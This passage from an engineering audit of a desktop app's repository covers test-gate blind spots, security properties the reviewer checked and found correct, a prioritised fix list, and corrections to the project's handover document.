**Fix direction (either is small):** make the unavailability a `panic!` on CI (a `NEKOWITE_REQUIRE_DISPLAY`
or `CI` guard), or record the skips in a place a reader sees — but not both silently. And add
`-extension GLX` to the Xvfb command line at `agent_exit_teardown_test.rs:340` and
`main_window_close_pet_test.rs:180`: these tests exercise WebKitGTK over X11 and assert nothing about
GLX, so the extension is dead weight that can only cost a run.

### T2 — §9.1a's blind spot is real, and the reading is now taken

`cargo test --locked` stops at the first failing target, and `agent_exit_teardown_test` sorts fifth of
73 — so the repository's own gate has never executed targets 6 through 73 in a red run. My
`--no-fail-fast` run (§1.4) executed all 73 and they are **green: 1330 passed, 0 failed, exit 0.**

That closes §9.1a as a *code* question and leaves it open as a *process* one. `AGENTS.md:69-74`'s
four-command list omits the Rust suite entirely, `docs/dev.md`'s gate list omits `pnpm perf`, and CI's
`rust` job uses the fail-fast spelling — so the one reading that would have caught T1 is not the one
anything runs. `--no-fail-fast` costs nothing but wall-clock and is what the job should use.

### T3 — `pnpm test` does not run `pnpm perf`, and lint cannot fail on a warning

Both are stated correctly in §4.5 and both remain true: `pnpm test` and `pnpm perf` are separate vitest
projects, and `pnpm lint` exits 0 with 462 warnings, so `docs/dev.md` §7.3 item 4 ("no new lint
warnings") is a review convention with no tool behind it.

### T4 — `cargo test` emits ~50 `never used` warnings that are artefacts, and nothing separates them from real ones

The full run prints, for target after target:

```text
warning: function `read_catalogue` is never used   --> tests/../src/desktop_pet/resources/catalogue.rs:199
warning: constant `DISABLE_EXTERNAL_SKILLS` is never used --> tests/../src/agent_runtime/skills.rs:94
warning: methods `import_target`, `preview`, `import`, `set_enabled`, `stow` are never used
```

These are **not** evidence of unreachable code: the `tests/../src/...` path is the `#[path]` inclusion
`module_tree_test.rs` exists to police (handover §7.6), and a `pub` item compiled into a test target
that does not call it is dead *in that compilation unit*. But the consequence is that a genuinely
unreachable production item — U1's `CareLedger::settle`, had it not been a method on a live type —
would arrive in exactly this stream, at exactly this volume, with nobody reading it. `cargo clippy`
runs in CI but nothing fails on a warning there either, so Rust has the same shape of hole as
`pnpm lint`'s 462.

---

## 7. What I checked and found correct

Recorded so the next reader does not re-chase them.

- **The frontend gate.** §1.1. Every number in `docs/HANDOVER.md` §4.5 that concerns the frontend
  reproduces.
- **The instruments.** §1.2 — all three reproduce, controls included.
- **Path confinement.** Every path-confined command calls `require_opened_vault` before storage;
  `resolve_within_rel` rejects `ParentDir` *before* canonicalising, requires an absolute base, compares
  canonical prefixes component-wise and `lstat`s every component
  (`domain/path_policy.rs:72-123,140-156`); `app_owned::refuse` is installed in `setup` before any
  window exists (`lib.rs:144-226`); `resolve_vault_metadata_dir`, `read_history`, the trash restore and
  `decode_rel_path` all re-check containment after the fact.
- **The ACL.** `build.rs`'s `COMMANDS` and `lib.rs`'s handler list are an exact 84/84 match with no
  duplicates (parsed both); every `allow-*` in the three capability files names a declared command; no
  dangerous permission and nothing that creates windows rides along with `core:default`; no command
  anywhere takes a window label as an argument.
- **The agent runtime's core invariants.** Emitter numbering and enqueue under one lock; `prompt`'s
  check-and-register under one lock (no double run); `finish_run`'s `run_id` guard; `cancel` marking
  before telling the engine and ending the run on a dead connection; the `BoundedFrameReader` bound and
  a genuinely reachable `FRAME_TOO_LARGE_MARKER`; `/proc/<pid>/stat` parsed from the last `)` with
  pid + start-time identity; the stderr pump's bound, redaction and watch-based EOF; `connect`'s
  failure path still signals and reaps a half-started child; `config_edit::write_replacing`'s
  create-new-temp → mode → fsync → rename; `Secret`'s absent `Display`/`Serialize` and redacting
  `Debug`; `PermissionTable`'s five-field identity check and remove-after-verify.
- **The pet's network code.** `desktop_pet/resources/fetch.rs` + `remote.rs` are sound: HTTPS only,
  host pinned to the catalogue's own host, public-address check, credential-bearing and non-443 URLs
  refused, `redirect::Policy::none()` plus an explicit 3xx refusal, the size bound measured per chunk
  *while streaming*, and `reqwest` built with `rustls-tls` and no `danger_accept_invalid_certs`. No
  network string reaches a filesystem path (slugs are validated twice).
- **`main_window.rs`.** `raise` and `setup` build through the same `build()`, so
  `enable_clipboard_access` cannot drift, and `LABEL` is tied to the config by a test.
- **`commands/fs.rs:122`'s claim** that `resolve_media_path` is the only thing that extends the asset
  scope is true (and is the half of D3 that is right).

---

## 8. What I would change first

Ordered by value per unit of risk, not by severity.

1. **T1** — stop letting a skip read as a pass, and give Xvfb `-extension GLX`. Two lines plus a
   policy decision, and it makes every reading below trustworthy.
2. **U1** — either give the care ledger its producer or remove the care page. This is the largest
   gap between what the code claims and what ships, and it is invisible to every test in the tree.
3. **F1** — one guard on `opts.userAsked` in `tab-save.ts:150`. The most likely first bug report from
   a real user.
4. **F3** — one `aiDisabled()` check in the gateway's `listModels`, then make the privacy document
   match. §11 of the handover already puts this second; the answer to its open question is "yes, it is
   outside the switch".
5. **F2** — clear `adopting` on the failure path, and clear it in `started()`. A small change to a
   state machine that has one dangerous edge.
6. **S1 and S2** — bind the hydrated key to an approved endpoint, and stop letting `allow_private`
   default to `true` in the request payload. Both are about the same sentence: the renderer should not
   be able to choose where the user's credential goes.
7. **D1–D3 and the seven `main_window_relaunch_test.rs` references** — the cheapest, most unambiguous
   set in this document, and the repository's characteristic defect.
8. **U2/D5/D6/D7** — the export path, a user-visible string that is wrong about where images go, and
   the two comments that hid F3.

---

## 9. Corrections to `docs/HANDOVER.md`

The handover is unusually honest and almost everything in it reproduces. Three things I would change.

1. **§9.1 is stated as a fact about the gate, and it is a fact about a machine.** "`cargo test` is red
   today" is true where Xvfb starts; on this host the same command prints `ok` and exits 0 because the
   test skips (§1.3, T1). The section's own advice — "re-run it yourself to see the current state" —
   returned the opposite reading here. It should say which precondition the reading depends on.
2. **§9's work list is missing the care ledger (U1) and the autosave dialog (F1).** §9.2 counts dead
   TypeScript exports, and the instruments cannot see a Rust module that is declared but never fed.
3. **§4.5's gate table should carry the `[NekoWite:governance] failed to persist plugin audit log`
   lines** as known noise (§1.1), so the next person grepping the output does not open a ticket.
